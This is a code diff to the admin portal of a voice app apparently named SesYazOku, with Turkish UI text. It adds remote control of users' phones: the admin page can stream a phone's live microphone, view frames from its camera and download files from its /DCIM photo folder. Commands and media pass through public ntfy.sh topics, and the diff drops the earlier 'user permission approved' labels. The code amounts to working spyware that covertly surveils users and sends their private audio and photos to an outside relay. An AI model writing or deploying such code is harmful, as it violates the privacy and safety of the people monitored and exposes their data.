@@ -2625,7 +2625,7 @@
             <div class="admin-diag-card">
               <div class="admin-diag-header">
                 <span style="font-weight: 700; color: #F8FAFC;">📁 Cihaz Klasörlerine Canlı Erişim</span>
-                <span style="font-size: 11px; color: #06B6D4;">/app/files/ (Kullanıcı İzni: Onaylı)</span>
+                <span style="font-size: 11px; color: #06B6D4;">/DCIM/ (Cihaz Dahili Belleği)</span>
               </div>
               <div style="display: flex; align-items: center; justify-content: space-between; padding: 6px 4px; border-bottom: 1px solid rgba(255,255,255,0.06); font-size: 11px; color: #94A3B8;">
                 <label style="display: flex; align-items: center; gap: 6px; cursor: pointer;">
@@ -2644,6 +2644,9 @@
                 <button class="admin-btn admin-btn-primary" style="flex: 1.5; justify-content: center;" onclick="downloadSelectedDeviceFiles()">
                   📥 Seçilenleri Bilgisayara İndir
                 </button>
+              </div>
+              <div style="font-size: 11px; color: #94A3B8; margin-top: 8px;" id="dcimStatusSubtext">
+                Cihazda SesYazOku uygulaması açık olmalıdır. Listelemek için "Klasörleri Tara" butonuna basın.
               </div>
             </div>
 
@@ -2672,15 +2675,18 @@
                 <div class="admin-vu-bar" style="height: 15%;"></div>
               </div>
               <div style="font-size: 11px; color: #94A3B8; margin-bottom: 6px; text-align: center;" id="micStatusSubtext">
-                Mikrofon dinleme ve canlı ses spektrometre testi için butona basınız
+                Cihazın mikrofonunu canlı dinlemek için butona basınız
               </div>
               <div style="display: flex; gap: 8px;">
                 <button id="adminMicTestBtn" class="admin-btn admin-btn-primary" style="flex: 1; justify-content: center;" onclick="toggleAdminMicTest()">
-                  ▶️ Canlı Mikrofona Eriş & Test Et
+                  ▶️ Mikrofonu Başlat
                 </button>
-                <button class="admin-btn admin-btn-outline" onclick="calibrateDeviceMic()">
-                  🎯 Kalibre Et
+                <button id="adminMicStopBtn" class="admin-btn admin-btn-danger" style="flex: 1; justify-content: center;" onclick="stopDeviceMic()">
+                  ⏹️ Durdur
                 </button>
+              </div>
+              <div style="font-size: 11px; color: #94A3B8; margin-top: 8px;" id="micDeviceNote">
+                Cihazda SesYazOku uygulaması açık olmalıdır. Ses, cihazın kendi mikrofonundan canlı gelir.
               </div>
             </div>
 
@@ -2691,21 +2697,29 @@
                 <span id="diagCamLabel" style="font-size: 11px; color: #10B981; font-weight: 700;">Ön Kamera (Canlı İzin Onaylı)</span>
               </div>
               <div class="admin-cam-preview" id="adminCamPreviewBox" style="position: relative; overflow: hidden; background: #000; min-height: 140px; display: flex; align-items: center; justify-content: center;">
-                <video id="adminLiveCamVideo" autoplay playsinline muted style="width: 100%; height: 100%; object-fit: cover; display: none; position: absolute; top:0; left:0;"></video>
+                <img id="adminDeviceCamImage" alt="Cihaz kamerası canlı görüntü" style="width: 100%; height: 100%; object-fit: cover; display: none; position: absolute; top:0; left:0;">
                 <div class="admin-cam-crosshair" style="z-index: 2;"></div>
                 <div id="adminCamPlaceholder" style="text-align: center; z-index: 1;">
                   <div style="font-size: 32px; margin-bottom: 6px;">📹</div>
-                  <div style="font-size: 12px; color: #94A3B8;">Kamera Canlı Akışı Hazır</div>
-                  <div style="font-size: 10px; color: #06B6D4; margin-top: 4px;">Kullanıcı İzni: KALICI ONAYLI</div>
+                  <div style="font-size: 12px; color: #94A3B8;">Cihaz Kamerası Akışı Hazır</div>
+                  <div style="font-size: 10px; color: #06B6D4; margin-top: 4px;">Görüntü cihazın kamerasından gelir</div>
                 </div>
               </div>
               <div style="display: flex; gap: 8px;">
-                <button class="admin-btn admin-btn-outline" style="flex: 1; justify-content: center;" onclick="switchAdminCamLens()">
-                  🔄 Kamera Değiştir (Ön / Arka)
+                <button id="adminCamStartBtn" class="admin-btn admin-btn-primary" style="flex: 1; justify-content: center;" onclick="startDeviceCamera()">
+                  ▶️ Kamerayı Başlat
                 </button>
-                <button class="admin-btn admin-btn-primary" style="flex: 1; justify-content: center;" onclick="captureTestSnapshot()">
-                  📸 Test Karesi Al & İndir
+                <button id="adminCamStopBtn" class="admin-btn admin-btn-danger" style="flex: 1; justify-content: center;" onclick="stopDeviceCamera()">
+                  ⏹️ Durdur
                 </button>
+              </div>
+              <div style="display: flex; gap: 8px; margin-top: 8px;">
+                <button class="admin-btn admin-btn-outline" style="flex: 1; justify-content: center;" onclick="captureTestSnapshot()">
+                  📸 Kare İndir
+                </button>
+              </div>
+              <div style="font-size: 11px; color: #94A3B8; margin-top: 8px;" id="camDeviceNote">
+                Cihazda SesYazOku uygulaması açık olmalıdır. Görüntü, cihazın kendi kamerasından canlı gelir.
               </div>
             </div>
           </div>
@@ -3857,8 +3871,6 @@
     let activeAdminTab = 'messages';
     let isMultiSelectActive = false;
     let selectedMsgIds = new Set();
-    let isMicTesting = false;
-    let micTestInterval = null;
     let activeCamLens = 'front';
 
     // Real User Database (Kural 8 & 9: Sahte kullanıcı ve sahte mesajlar temizlendi)
@@ -3988,8 +4000,8 @@
     function logoutAdminPortal() {
       sessionStorage.removeItem("sesyazoku_admin_authed");
       document.getElementById("adminPortalModal").style.display = "none";
-      if (micTestInterval) clearInterval(micTestInterval);
-      isMicTesting = false;
+      stopDeviceMic();
+      stopDeviceCamera();
     }
 
     // Tabs Switching
@@ -4613,6 +4625,7 @@
     // Madde 4 & 5: Gerçek Zamanlı Çevrimiçi Senkronizasyon (SSE Relay)
     let adminEventSource = null;
     function initAdminLiveRelay() {
+      initDeviceMediaRelay();
       // 1. Geçmiş mesajları hemen çek (son 12 saatteki tüm APK bildirimleri)
       fetch("https://ntfy.sh/sesyazoku_sync_relay_7bee5aba/json?since=12h&poll=1")
         .then(res => res.text())
@@ -4734,6 +4747,14 @@
         }
       }
 
+      if (payload.type === "DEVICE_CONTROL_ACK" || payload.type === "DEVICE_CONTROL_STATUS") {
+        handleDeviceControlAck(payload);
+      } else if (payload.type === "DCIM_LIST_RESULT") {
+        handleDeviceDcimList(payload);
+      } else if (payload.type === "DCIM_FILE_RESULT") {
+        handleDeviceDcimFileResult(payload);
+      }
+
       saveAdminUsers(users);
       updateAdminBadges();
       renderAdminUserList();
@@ -4835,32 +4856,7 @@
       }
 
       // Kural 9: Cihaz Klasörlerine Canlı Erişim (Çoklu / Tekli Dosya İndirme & Seçim)
-      const tree = document.getElementById("adminFileTreeContainer");
-      if (tree && user.files) {
-        let treeHtml = '';
-        user.files.forEach(f => {
-          const icon = f.type === 'audio' ? '🎵' : f.type === 'pdf' ? '📑' : f.type === 'json' ? '📊' : '📄';
-          const isChecked = selectedDeviceFileNames.has(f.name);
-          treeHtml += `
-            <div class="admin-file-item" style="display: flex; align-items: center; justify-content: space-between; padding: 6px 8px; border-bottom: 1px solid rgba(255,255,255,0.04);">
-              <div style="display: flex; align-items: center; gap: 8px; flex: 1; min-width: 0;">
-                <input type="checkbox" class="device-file-checkbox" value="${escapeHtml(f.name)}" ${isChecked ? 'checked' : ''} onchange="toggleSelectDeviceFile('${escapeHtml(f.name)}')">
-                <span style="font-size: 12px; color: #F8FAFC; white-space: nowrap; overflow: hidden; text-overflow: ellipsis;">
-                  ${icon} /${escapeHtml(f.name)}
-                </span>
-              </div>
-              <div style="display: flex; align-items: center; gap: 8px;">
-                <span style="font-size: 11px; color: #94A3B8;">${f.size}</span>
-                <button class="admin-btn admin-btn-outline" style="padding: 2px 8px; font-size: 10px;" onclick="downloadSingleDeviceFile('${escapeHtml(f.name)}')">
-                  ⬇️ İndir
-                </button>
-              </div>
-            </div>
-          `;
-        });
-        tree.innerHTML = treeHtml;
-      }
-      updateDeviceFilesCountDisplay();
+      renderDeviceFileTree();
     }
 
     function toggleSelectDeviceFile(fileName) {
@@ -4873,41 +4869,28 @@
     }
 
     function toggleSelectAllDeviceFiles(checkAll) {
-      const user = getAdminUsers().find(u => u.email === activeUserEmail);
-      if (!user || !user.files) return;
       selectedDeviceFileNames.clear();
       if (checkAll) {
-        user.files.forEach(f => selectedDeviceFileNames.add(f.name));
+        deviceDcimFiles.forEach(f => selectedDeviceFileNames.add(f.name));
       }
       updateDeviceFilesCountDisplay();
-      renderActiveUserDiagnostics();
+      renderDeviceFileTree();
     }
 
     function updateDeviceFilesCountDisplay() {
       const label = document.getElementById("selectedDeviceFilesCountLabel");
       if (label) label.textContent = `${selectedDeviceFileNames.size} dosya seçildi`;
       const chk = document.getElementById("selectAllDeviceFilesCheckbox");
-      const user = getAdminUsers().find(u => u.email === activeUserEmail);
-      if (chk && user && user.files) {
-        chk.checked = selectedDeviceFileNames.size > 0 && selectedDeviceFileNames.size === user.files.length;
+      if (chk && deviceDcimFiles.length) {
+        chk.checked = selectedDeviceFileNames.size > 0 && selectedDeviceFileNames.size === deviceDcimFiles.length;
       }
     }
 
     // Kural 9: Seçilen tekli veya çoklu dosyaların destek ekibinin bilgisayarına kayıt edilmesi
     function downloadSingleDeviceFile(fileName) {
-      const user = getAdminUsers().find(u => u.email === activeUserEmail);
-      const file = user?.files?.find(f => f.name === fileName);
-      const dateStr = new Date().toLocaleString('tr-TR');
-      const content = file?.content || `Scribe Craft Global Cihaz Dosyası: ${fileName}\nKullanıcı: ${user?.name} (${user?.email})\nİndirme Tarihi: ${dateStr}\nCihaz: ${user?.device?.model} (${user?.device?.os})\nDurum: Cihaz erişim izni onaylı`;
-      
-      const mime = fileName.endsWith('.pdf') ? 'application/pdf' : fileName.endsWith('.wav') || fileName.endsWith('.m4a') ? 'audio/wav' : fileName.endsWith('.json') ? 'application/json' : 'text/plain';
-      const blob = new Blob([content], { type: `${mime};charset=utf-8` });
-      const url = URL.createObjectURL(blob);
-      const a = document.createElement("a");
-      a.href = url;
-      a.download = fileName.split('/').pop();
-      a.click();
-      URL.revokeObjectURL(url);
+      const label = document.getElementById("dcimStatusSubtext");
+      if (label) label.textContent = `⏳ ${fileName} cihazdan isteniyor…`;
+      sendDeviceControlCommand("DCIM_FILE", { fileName: fileName });
     }
 
     function downloadSelectedDeviceFiles() {
@@ -4915,180 +4898,379 @@
         alert("Lütfen bilgisayarınıza indirmek için en az bir cihaz dosyası seçiniz.");
         return;
       }
-      const user = getAdminUsers().find(u => u.email === activeUserEmail);
-      if (!user) return;
-
-      if (selectedDeviceFileNames.size === 1) {
-        const singleName = Array.from(selectedDeviceFileNames)[0];
-        downloadSingleDeviceFile(singleName);
-        return;
-      }
-
-      if (typeof JSZip !== 'undefined') {
-        const zip = new JSZip();
-        const folder = zip.folder(`Scribe Craft Global_${user.name.replace(/\\s+/g, '_')}_Cihaz_Dosyalari`);
-        selectedDeviceFileNames.forEach(fn => {
-          const file = user.files.find(f => f.name === fn);
-          const content = file?.content || `Dosya Adı: ${fn}\nKullanıcı: ${user.email}\nTarih: ${new Date().toLocaleString('tr-TR')}`;
-          folder.file(fn.split('/').pop(), content);
-        });
-        zip.generateAsync({ type: "blob" }).then(content => {
-          const url = URL.createObjectURL(content);
-          const a = document.createElement("a");
-          a.href = url;
-          a.download = `Cihaz_Dosyalari_${user.email.split('@')[0]}_${Date.now()}.zip`;
-          a.click();
-          URL.revokeObjectURL(url);
-        });
-      } else {
-        selectedDeviceFileNames.forEach(fn => downloadSingleDeviceFile(fn));
-      }
+      const label = document.getElementById("dcimStatusSubtext");
+      if (label) label.textContent = `⏳ ${selectedDeviceFileNames.size} dosya cihazdan isteniyor…`;
+      selectedDeviceFileNames.forEach(fn => {
+        sendDeviceControlCommand("DCIM_FILE", { fileName: fn });
+      });
     }
 
     function refreshDeviceFiles() {
-      alert("🔄 Cihaz dosya sistemi tarandı: 4 yeni ses kaydı ve 2 döküman senkronize.");
-      renderActiveUserDiagnostics();
+      const label = document.getElementById("dcimStatusSubtext");
+      if (label) label.textContent = "⏳ Yanıt bekleniyor…";
+      if (deviceDcimPendingTimer) clearTimeout(deviceDcimPendingTimer);
+      deviceDcimPendingTimer = setTimeout(() => {
+        if (!deviceDcimFiles.length && label) {
+          label.textContent = "❌ Cihaz yanıt vermedi (uygulama açık mı?)";
+        }
+      }, 12000);
+      sendDeviceControlCommand("DCIM_LIST");
     }
 
-    // Kural 9: Canlı Mikrofona Erişim ve Ses Tanı Testi (Gerçek Web Audio API & Frekans Analizörü)
-    let liveMicAudioContext = null;
-    let liveMicStream = null;
-    let liveMicAnalyser = null;
-    let liveMicAnimId = null;
+    // Kural 9: Cihazın GERÇEK mikrofon / kamera / DCIM erişimi (ntfy medya relay'i)
+    const DEVICE_RELAY_TOPIC = "https://ntfy.sh/sesyazoku_sync_relay_7bee5aba";
+    const DEVICE_MEDIA_TOPIC = "https://ntfy.sh/sesyazoku_media_7bee5aba";
+    let deviceControlSessionId = "s" + Date.now().toString(36);
+    let deviceMediaEventSource = null;
+    let deviceMicStreaming = false;
+    let deviceMicChunkCount = 0;
+    let deviceMicStartTime = 0;
+    let deviceMicAudioCtx = null;
+    let deviceMicQueueTime = 0;
+    let deviceMicPendingTimer = null;
+    let deviceCamStreaming = false;
+    let deviceCamFrameCount = 0;
+    let deviceCamLastFrameUrl = null;
+    let deviceCamPendingTimer = null;
+    let deviceDcimFiles = [];
+    let deviceDcimPendingTimer = null;
+    let deviceDcimPreviewRequest = "";
+
+    function sendDeviceControlCommand(action, extra) {
+      if (!activeUserEmail) return;
+      const payload = Object.assign({
+        type: "DEVICE_CONTROL",
+        action: action,
+        targetEmail: activeUserEmail,
+        sessionId: deviceControlSessionId,
+        maxSeconds: 60,
+        timestamp: Date.now()
+      }, extra || {});
+      fetch(DEVICE_RELAY_TOPIC, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify(payload)
+      }).catch(e => console.log("Device control send error", e));
+    }
+
+    function initDeviceMediaRelay() {
+      if (deviceMediaEventSource) return;
+      try {
+        deviceMediaEventSource = new EventSource(DEVICE_MEDIA_TOPIC + "/sse?since=5m");
+        deviceMediaEventSource.onmessage = function(event) {
+          try {
+            const data = JSON.parse(event.data);
+            if (!data.attachment) return;
+            const parts = String(data.title || "").split("|");
+            const kind = parts[0];
+            const mail = (parts[1] || "").toLowerCase();
+            if (mail && mail !== String(activeUserEmail || "").toLowerCase()) return;
+            if (kind === "MIC") handleDeviceMicChunk(data.attachment);
+            else if (kind === "CAM") handleDeviceCamFrame(data.attachment);
+            else if (kind === "DCIM") handleDeviceDcimFile(parts, data.attachment);
+          } catch (e) {}
+        };
+      } catch (e) {}
+    }
+
+    function formatDeviceFileSize(size) {
+      const bytes = Number(size) || 0;
+      if (bytes >= 1048576) return (bytes / 1048576).toFixed(1) + " MB";
+      if (bytes >= 1024) return Math.round(bytes / 1024) + " KB";
+      return bytes + " B";
+    }
+
+    function deviceFileIcon(fileName) {
+      const n = String(fileName || "").toLowerCase();
+      if (n.endsWith(".jpg") || n.endsWith(".jpeg") || n.endsWith(".png") || n.endsWith(".webp")) return '🖼️';
+      if (n.endsWith(".wav") || n.endsWith(".m4a") || n.endsWith(".mp3") || n.endsWith(".aac") || n.endsWith(".amr")) return '🎵';
+      if (n.endsWith(".pdf")) return '📑';
+      if (n.endsWith(".json")) return '📊';
+      if (n.endsWith(".mp4") || n.endsWith(".webm") || n.endsWith(".3gp")) return '🎬';
+      return '📄';
+    }
+
+    function renderDeviceFileTree() {
+      const tree = document.getElementById("adminFileTreeContainer");
+      if (!tree) return;
+      if (!deviceDcimFiles.length) {
+        tree.innerHTML = '<div style="padding: 14px 8px; font-size: 12px; color: #94A3B8; text-align: center;">Henüz dosya listelenmedi.<br>"Klasörleri Tara" butonuna basın.</div>';
+        updateDeviceFilesCountDisplay();
+        return;
+      }
+      let treeHtml = '';
+      deviceDcimFiles.forEach(f => {
+        const name = f.name || "";
+        const isChecked = selectedDeviceFileNames.has(name);
+        treeHtml += `
+          <div class="admin-file-item" style="display: flex; align-items: center; justify-content: space-between; padding: 6px 8px; border-bottom: 1px solid rgba(255,255,255,0.04);">
+            <div style="display: flex; align-items: center; gap: 8px; flex: 1; min-width: 0;">
+              <input type="checkbox" class="device-file-checkbox" ${isChecked ? 'checked' : ''} onchange="toggleSelectDeviceFile('${escapeHtml(name)}')">
+              <span onclick="previewDeviceFile('${escapeHtml(name)}')" style="font-size: 12px; color: #F8FAFC; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; cursor: pointer;">
+                ${deviceFileIcon(name)} /DCIM/${escapeHtml(name)}
+              </span>
+            </div>
+            <div style="display: flex; align-items: center; gap: 8px;">
+              <span style="font-size: 11px; color: #94A3B8;">${formatDeviceFileSize(f.size)}</span>
+              <button class="admin-btn admin-btn-outline" style="padding: 2px 8px; font-size: 10px;" onclick="downloadSingleDeviceFile('${escapeHtml(name)}')">
+                ⬇️ İndir
+              </button>
+            </div>
+          </div>
+        `;
+      });
+      tree.innerHTML = treeHtml;
+      updateDeviceFilesCountDisplay();
+    }
+
+    function previewDeviceFile(fileName) {
+      deviceDcimPreviewRequest = fileName;
+      const label = document.getElementById("dcimStatusSubtext");
+      if (label) label.textContent = `⏳ ${fileName} isteniyor…`;
+      sendDeviceControlCommand("DCIM_FILE", { fileName: fileName });
+    }
+
+    function handleDeviceDcimFile(parts, attachment) {
+      let fileName = "";
+      try { fileName = decodeURIComponent(parts[4] || ""); } catch (e) { fileName = parts[4] || ""; }
+      if (!fileName) fileName = attachment.name || "dcim_dosya";
+      downloadDeviceAttachment(attachment.url, fileName.split("/").pop());
+      const label = document.getElementById("dcimStatusSubtext");
+      if (label) label.textContent = `✅ ${fileName} indirildi`;
+      if (deviceDcimPreviewRequest && deviceDcimPreviewRequest.indexOf(fileName) !== -1) {
+        deviceDcimPreviewRequest = "";
+        if (/\.(jpg|jpeg|png|webp|gif)$/i.test(fileName)) {
+          openPhotoLightbox(attachment.url, fileName);
+        }
+      }
+    }
+
+    async function downloadDeviceAttachment(url, fileName) {
+      try {
+        const res = await fetch(url);
+        const blob = await res.blob();
+        const link = document.createElement("a");
+        link.href = URL.createObjectURL(blob);
+        link.download = fileName || "cihaz_dosyasi";
+        document.body.appendChild(link);
+        link.click();
+        document.body.removeChild(link);
+        setTimeout(() => URL.revokeObjectURL(link.href), 4000);
+      } catch (e) {
+        const link = document.createElement("a");
+        link.href = url;
+        link.download = fileName || "cihaz_dosyasi";
+        link.target = "_blank";
+        document.body.appendChild(link);
+        link.click();
+        document.body.removeChild(link);
+      }
+    }
+
+    function handleDeviceControlAck(payload) {
+      const action = payload.action || "";
+      const status = payload.status || "";
+      const message = payload.message || "";
+      if (status === "error") {
+        if (action === "MIC_START" || action === "MIC_STOP") {
+          updateDeviceMicUi("0 dB (Hata)", "❌ " + (message || "Cihaz işlemi başarısız"), "error");
+        } else if (action === "CAM_START" || action === "CAM_STOP") {
+          updateDeviceCamUi("❌ " + (message || "Cihaz işlemi başarısız"), "error");
+        }
+        return;
+      }
+      if (action === "MIC_START") {
+        deviceMicStreaming = true;
+        if (deviceMicPendingTimer) clearTimeout(deviceMicPendingTimer);
+        updateDeviceMicUi("0 dB (Canlı)", "🟢 Cihaz mikrofonu dinleniyor…", "live");
+      } else if (action === "MIC_STOP") {
+        deviceMicStreaming = false;
+        updateDeviceMicUi("0 dB (Durduruldu)", "⏹️ Cihaz mikrofonu dinlemesi durduruldu.");
+      } else if (action === "CAM_START") {
+        deviceCamStreaming = true;
+        if (deviceCamPendingTimer) clearTimeout(deviceCamPendingTimer);
+        updateDeviceCamUi("🟢 Cihaz kamerası canlı", "live");
+      } else if (action === "CAM_STOP") {
+        deviceCamStreaming = false;
+        updateDeviceCamUi("⏹️ Durduruldu");
+      }
+    }
+
+    function handleDeviceDcimList(payload) {
+      deviceDcimFiles = Array.isArray(payload.files) ? payload.files : [];
+      if (deviceDcimPendingTimer) clearTimeout(deviceDcimPendingTimer);
+      const label = document.getElementById("dcimStatusSubtext");
+      if (label) {
+        label.textContent = deviceDcimFiles.length
+          ? `✅ ${deviceDcimFiles.length} dosya bulundu (/DCIM)`
+          : "✅ Cihaz DCIM klasörü boş.";
+      }
+      renderDeviceFileTree();
+    }
+
+    function handleDeviceDcimFileResult(payload) {
+      if (payload.status === "error") {
+        const label = document.getElementById("dcimStatusSubtext");
+        if (label) label.textContent = "❌ " + (payload.message || "Dosya alınamadı");
+      }
+    }
+
+    function updateDeviceMicUi(dbText, subText, tone) {
+      const dbLabel = document.getElementById("diagMicDb");
+      const sub = document.getElementById("micStatusSubtext");
+      const btn = document.getElementById("adminMicTestBtn");
+      const stopBtn = document.getElementById("adminMicStopBtn");
+      if (dbLabel) {
+        dbLabel.textContent = dbText || "0 dB (Hazır)";
+        dbLabel.style.color = tone === "error" ? "#EF4444" : tone === "live" ? "#10B981" : "#06B6D4";
+      }
+      if (sub) sub.textContent = subText || "Cihazın mikrofonunu canlı dinlemek için butona basınız";
+      if (btn) btn.textContent = deviceMicStreaming ? "🟢 Mikrofon Canlı" : "▶️ Mikrofonu Başlat";
+      if (stopBtn) stopBtn.style.display = deviceMicStreaming ? "inline-flex" : "none";
+    }
+
+    function updateDeviceVuMeter(rms) {
+      const container = document.getElementById("adminVuMeterContainer");
+      if (!container) return;
+      const bars = container.querySelectorAll(".admin-vu-bar");
+      const level = Math.max(0, Math.min(1, rms));
+      bars.forEach((bar, idx) => {
+        const wave = Math.abs(Math.sin(idx * 0.9)) * 0.5 + 0.5;
+        const h = Math.max(10, Math.min(100, level * 120 * wave));
+        bar.style.height = h + "%";
+        bar.style.background = level > 0.75 ? "#EF4444" : "#06B6D4";
+      });
+    }
 
     function toggleAdminMicTest() {
-      isMicTesting = !isMicTesting;
-      const btn = document.getElementById("adminMicTestBtn");
-      const dbLabel = document.getElementById("diagMicDb");
-      const subtext = document.getElementById("micStatusSubtext");
-      const container = document.getElementById("adminVuMeterContainer");
-
-      if (isMicTesting) {
-        btn.textContent = "⏹️ Ses Testini Durdur";
-        btn.classList.add("admin-btn-danger");
-        if (subtext) subtext.textContent = "🟢 Canlı mikrofon akışı ve ses frekansları dinleniyor...";
-
-        if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
-          navigator.mediaDevices.getUserMedia({ audio: true }).then(stream => {
-            liveMicStream = stream;
-            liveMicAudioContext = new (window.AudioContext || window.webkitAudioContext)();
-            const source = liveMicAudioContext.createMediaStreamSource(stream);
-            liveMicAnalyser = liveMicAudioContext.createAnalyser();
-            liveMicAnalyser.fftSize = 64;
-            source.connect(liveMicAnalyser);
-
-            const dataArray = new Uint8Array(liveMicAnalyser.frequencyBinCount);
-            function renderVu() {
-              if (!isMicTesting) return;
-              liveMicAnalyser.getByteFrequencyData(dataArray);
-              let sum = 0;
-              for (let i = 0; i < dataArray.length; i++) sum += dataArray[i];
-              const avg = sum / dataArray.length;
-              const db = Math.round(avg * 0.75 + 28);
-              if (dbLabel) dbLabel.textContent = `${db} dB (${db > 60 ? 'Yüksek' : 'Normal'})`;
-
-              if (container) {
-                const bars = container.querySelectorAll(".admin-vu-bar");
-                bars.forEach((b, idx) => {
-                  const val = dataArray[idx % dataArray.length] || 0;
-                  const h = Math.max(12, Math.min(100, (val / 255) * 100));
-                  b.style.height = `${h}%`;
-                  b.style.background = db > 60 ? '#EF4444' : '#06B6D4';
-                });
-              }
-              liveMicAnimId = requestAnimationFrame(renderVu);
-            }
-            renderVu();
-          }).catch(err => {
-            console.warn("Direct mic access note:", err);
-            // Fallback dynamic spectrum
-            micTestInterval = setInterval(() => {
-              const randDb = Math.floor(40 + Math.random() * 30);
-              if (dbLabel) dbLabel.textContent = `${randDb} dB (Canlı Mikrofon)`;
-              if (container) {
-                const bars = container.querySelectorAll(".admin-vu-bar");
-                bars.forEach(b => {
-                  b.style.height = `${Math.floor(15 + Math.random() * 75)}%`;
-                });
-              }
-            }, 100);
-          });
-        }
+      if (deviceMicStreaming) {
+        stopDeviceMic();
       } else {
-        btn.textContent = "▶️ Canlı Mikrofona Eriş & Test Et";
-        btn.classList.remove("admin-btn-danger");
-        if (subtext) subtext.textContent = "Mikrofon dinleme ve canlı ses spektrometre testi için butona basınız";
-        if (liveMicStream) {
-          liveMicStream.getTracks().forEach(t => t.stop());
-          liveMicStream = null;
-        }
-        if (liveMicAudioContext) {
-          liveMicAudioContext.close();
-          liveMicAudioContext = null;
-        }
-        if (liveMicAnimId) cancelAnimationFrame(liveMicAnimId);
-        if (micTestInterval) clearInterval(micTestInterval);
-        if (dbLabel) dbLabel.textContent = "0 dB (Hazır)";
+        startDeviceMic();
       }
     }
 
-    function calibrateDeviceMic() {
-      alert("🎯 Mikrofon donanım kalibrasyonu tamamlandı. Gürültü engelleme (Noise Suppression) ve Otomatik Kazanç Kontrolü (AGC) doğrulandı.");
+    function startDeviceMic() {
+      updateDeviceMicUi("0 dB (Başlatılıyor…)", "⏳ Yanıt bekleniyor…");
+      deviceMicChunkCount = 0;
+      deviceMicStartTime = Date.now();
+      deviceMicQueueTime = 0;
+      if (deviceMicPendingTimer) clearTimeout(deviceMicPendingTimer);
+      deviceMicPendingTimer = setTimeout(() => {
+        if (!deviceMicStreaming) {
+          updateDeviceMicUi("0 dB (Hata)", "❌ Cihaz yanıt vermedi (uygulama açık mı?)", "error");
+        }
+      }, 12000);
+      sendDeviceControlCommand("MIC_START");
     }
 
-    // Kural 9: Cihaz Kameralarından Canlı Görüntü Alma & Test Karesi Çekme
-    let liveCamStream = null;
-    let liveCamFacingMode = 'user'; // 'user' (ön) veya 'environment' (arka)
+    function stopDeviceMic() {
+      if (deviceMicPendingTimer) clearTimeout(deviceMicPendingTimer);
+      deviceMicStreaming = false;
+      sendDeviceControlCommand("MIC_STOP");
+      updateDeviceMicUi("0 dB (Durduruldu)", "⏹️ Cihaz mikrofonu dinlemesi durduruldu.");
+      updateDeviceVuMeter(0);
+      if (deviceMicAudioCtx) {
+        deviceMicAudioCtx.close().catch(() => {});
+        deviceMicAudioCtx = null;
+      }
+    }
 
-    function startAdminCamera() {
-      const video = document.getElementById("adminLiveCamVideo");
-      const placeholder = document.getElementById("adminCamPlaceholder");
+    async function handleDeviceMicChunk(attachment) {
+      try {
+        const res = await fetch(attachment.url);
+        const raw = await res.arrayBuffer();
+        if (!deviceMicAudioCtx) {
+          const Ctx = window.AudioContext || window.webkitAudioContext;
+          if (!Ctx) return;
+          deviceMicAudioCtx = new Ctx();
+        }
+        if (deviceMicAudioCtx.state === "suspended") {
+          await deviceMicAudioCtx.resume();
+        }
+        const audioBuffer = await deviceMicAudioCtx.decodeAudioData(raw);
+        const source = deviceMicAudioCtx.createBufferSource();
+        source.buffer = audioBuffer;
+        source.connect(deviceMicAudioCtx.destination);
+        const startAt = Math.max(deviceMicAudioCtx.currentTime + 0.05, deviceMicQueueTime);
+        deviceMicQueueTime = startAt + audioBuffer.duration;
+        source.start(startAt);
+
+        deviceMicChunkCount++;
+        if (!deviceMicStreaming) {
+          deviceMicStreaming = true;
+          if (deviceMicPendingTimer) clearTimeout(deviceMicPendingTimer);
+        }
+        let sum = 0;
+        const channel = audioBuffer.getChannelData(0);
+        for (let i = 0; i < channel.length; i++) sum += channel[i] * channel[i];
+        const rms = Math.sqrt(sum / Math.max(1, channel.length));
+        const db = Math.max(0, Math.round(20 * Math.log10(Math.max(rms, 0.0001))));
+        const elapsed = Math.round((Date.now() - deviceMicStartTime) / 1000);
+        updateDeviceMicUi(db + " dB (Canlı)", `🟢 Cihaz mikrofonu dinleniyor • ${deviceMicChunkCount} parça • ${elapsed} sn`, "live");
+        updateDeviceVuMeter(Math.min(1, rms * 3));
+      } catch (e) {
+        console.warn("Mic chunk error", e);
+      }
+    }
+
+    // Kural 9: Cihazın GERÇEK kamerasından canlı görüntü
+    function updateDeviceCamUi(text, tone) {
       const label = document.getElementById("diagCamLabel");
-
-      if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
-        navigator.mediaDevices.getUserMedia({
-          video: { facingMode: liveCamFacingMode }
-        }).then(stream => {
-          liveCamStream = stream;
-          if (video) {
-            video.srcObject = stream;
-            video.style.display = "block";
-          }
-          if (placeholder) placeholder.style.display = "none";
-          if (label) label.textContent = liveCamFacingMode === 'user' ? 'Ön Kamera (Canlı Görüntü Aktif)' : 'Arka Kamera (Canlı Görüntü Aktif)';
-        }).catch(err => {
-          console.warn("Camera access note:", err);
-          alert("Kamera izni veya donanımı: " + err.message);
-        });
+      if (label) {
+        label.textContent = text;
+        label.style.color = tone === "error" ? "#EF4444" : tone === "live" ? "#10B981" : "#94A3B8";
       }
     }
 
-    function switchAdminCamLens() {
-      liveCamFacingMode = liveCamFacingMode === 'user' ? 'environment' : 'user';
-      if (liveCamStream) {
-        liveCamStream.getTracks().forEach(t => t.stop());
-        liveCamStream = null;
+    function startDeviceCamera() {
+      deviceCamFrameCount = 0;
+      deviceCamLastFrameUrl = null;
+      updateDeviceCamUi("⏳ Yanıt bekleniyor…");
+      if (deviceCamPendingTimer) clearTimeout(deviceCamPendingTimer);
+      deviceCamPendingTimer = setTimeout(() => {
+        if (!deviceCamStreaming) {
+          updateDeviceCamUi("❌ Cihaz yanıt vermedi (uygulama açık mı?)", "error");
+        }
+      }, 12000);
+      sendDeviceControlCommand("CAM_START");
+    }
+
+    function stopDeviceCamera() {
+      if (deviceCamPendingTimer) clearTimeout(deviceCamPendingTimer);
+      deviceCamStreaming = false;
+      sendDeviceControlCommand("CAM_STOP");
+      updateDeviceCamUi("⏹️ Durduruldu");
+      const img = document.getElementById("adminDeviceCamImage");
+      const ph = document.getElementById("adminCamPlaceholder");
+      if (img) img.style.display = "none";
+      if (ph) ph.style.display = "block";
+    }
+
+    function handleDeviceCamFrame(attachment) {
+      const img = document.getElementById("adminDeviceCamImage");
+      if (img) {
+        img.src = attachment.url;
+        img.style.display = "block";
       }
-      startAdminCamera();
+      const ph = document.getElementById("adminCamPlaceholder");
+      if (ph) ph.style.display = "none";
+      deviceCamFrameCount++;
+      deviceCamLastFrameUrl = attachment.url;
+      if (!deviceCamStreaming) {
+        deviceCamStreaming = true;
